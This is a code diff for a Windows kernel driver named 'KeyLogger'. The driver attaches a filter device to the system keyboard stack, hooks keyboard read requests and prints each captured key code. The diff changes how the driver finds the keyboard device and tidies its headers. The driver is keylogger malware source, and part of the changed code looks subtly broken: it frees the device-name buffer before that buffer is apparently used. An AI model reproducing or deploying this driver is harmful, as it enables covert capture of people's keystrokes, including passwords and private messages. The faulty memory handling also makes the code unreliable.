@@ -1,42 +1,12 @@
-#include <ntddk.h>
+#include <initguid.h>
+#include <wdm.h>
 #include <ntddkbd.h>
-#include <tchar.h>
+
+#include "deviceExtension.h"
+#include "info.h"
+#include "ioCtls.h"
 
 #pragma warning(disable: 5045) //Disable Spectre
-
-#define DEVICE_NAME						\
-	_T("KeyLogger")
-
-#define DEVICE_PATH						\
-	_T("\\Device\\") DEVICE_NAME
-
-#define KEYBOARD_DEVICE_NAME				\
-	_T("KeyboardClass0")
-
-#define KEYBOARD_DEVICE_PATH				\
-	_T("\\Device\\") KEYBOARD_DEVICE_NAME
-
-#define SYMBOLIC_LINK_NAME				\
-	_T("\\DosDevices\\KeyLogger")
-
-#define IOCTL(CODE)						\
-	CTL_CODE(							\
-		FILE_DEVICE_UNKNOWN,			\
-		0x800 + CODE,					\
-		METHOD_BUFFERED,				\
-		FILE_ANY_ACCESS)
-
-#define GET_KEY IOCTL(1)
-
-#pragma pack(push, 1)
-
-typedef struct _DEVICE_EXTENSION
-{
-	PDEVICE_OBJECT pTargetDeviceObject;
-
-} DEVICE_EXTENSION, *PDEVICE_EXTENSION;
-
-#pragma pack(pop)
 
 VOID
 UnloadRoutine(
@@ -66,6 +36,7 @@ HookCompletionRoutine(
 	PVOID pContext)
 {
 	UNREFERENCED_PARAMETER(pContext);
+	ObfDereferenceObject(pDeviceObject);
 
 	if (NT_SUCCESS(pIrp->IoStatus.Status))
 	{
@@ -75,13 +46,13 @@ HookCompletionRoutine(
 			DbgPrint("KeyLogger: %hu", keyInfo->MakeCode);
 	}
 
-	ObfDereferenceObject(pDeviceObject);
-
 	if (pIrp->PendingReturned)
 		IoMarkIrpPending(pIrp);
 
 	return pIrp->IoStatus.Status;
 }
+
+
 
 NTSTATUS
 HookRoutine(
@@ -122,6 +93,8 @@ DeviceControlRoutine(
 	PDEVICE_OBJECT pDeviceObject,
 	PIRP pIrp)
 {
+	UNREFERENCED_PARAMETER(pDeviceObject);
+
 	PIO_STACK_LOCATION pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
 	ULONG controlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
 	NTSTATUS exitCode = STATUS_SUCCESS;
@@ -156,32 +129,35 @@ DriverEntry(
 	pDriverObject->DriverUnload = UnloadRoutine;
 
 	NTSTATUS returnedStatus;
-
-	UNICODE_STRING deviceName;
-	RtlInitUnicodeString(&deviceName, DEVICE_PATH);
-	
 	PDEVICE_OBJECT pDeviceObject;
 
 	returnedStatus = IoCreateDevice(
 		pDriverObject,
 		sizeof(DEVICE_EXTENSION),
-		&deviceName,
-		FILE_DEVICE_KEYBOARD,
+		NULL, FILE_DEVICE_KEYBOARD,
 		0, FALSE,
 		&pDeviceObject);
 	
 	if (!NT_SUCCESS(returnedStatus))
 		return returnedStatus;
 
-	pDeviceObject->Flags =
-		DO_BUFFERED_IO |
-		DO_POWER_PAGABLE |
-		DO_DEVICE_HAS_NAME |
-		DRVO_LEGACY_RESOURCES;
+	pDeviceObject->Flags = DO_BUFFERED_IO;
+
+	PZZWSTR symLinks;
+	returnedStatus = IoGetDeviceInterfaces(
+		&GUID_CLASS_KEYBOARD,
+		NULL, 0, &symLinks);
+
+	if (!NT_SUCCESS(returnedStatus))
+	{
+		IoDeleteDevice(pDeviceObject);
+		return returnedStatus;
+	}
 
 	UNICODE_STRING targetDeviceName;
-	RtlInitUnicodeString(&targetDeviceName, KEYBOARD_DEVICE_PATH);
+	RtlInitUnicodeString(&targetDeviceName, symLinks);
 
+	ExFreePool(symLinks);
 	PDEVICE_EXTENSION pDeviceExtension = pDeviceObject->DeviceExtension;
 
 	returnedStatus = IoAttachDevice(
